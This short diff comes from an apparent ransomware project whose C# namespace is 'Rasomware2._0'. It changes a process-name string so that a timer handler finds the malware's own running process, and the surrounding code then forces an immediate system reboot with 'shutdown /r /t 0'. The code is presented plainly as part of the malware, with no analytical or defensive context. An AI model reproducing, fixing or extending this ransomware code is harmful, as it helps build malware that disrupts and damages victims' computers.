@@ -1,0 +1,13 @@
+diff --git a/original/Form1.cs b/old/Form1.cs
+index 01f5b44..2b05f29 100644
+--- a/original/Form1.cs
++++ b/old/Form1.cs
+@@ -144,7 +144,7 @@ namespace Rasomware2._0
+         {
+             tmr_clock.Stop();
+             Process[] _process = null;
+-            _process = Process.GetProcessesByName("Ransomware2.0");
++            _process = Process.GetProcessesByName("Rasomware2.0");
+             foreach (Process proces in _process)
+             {
+                 Process.Start("shutdown", "/r /t 0");
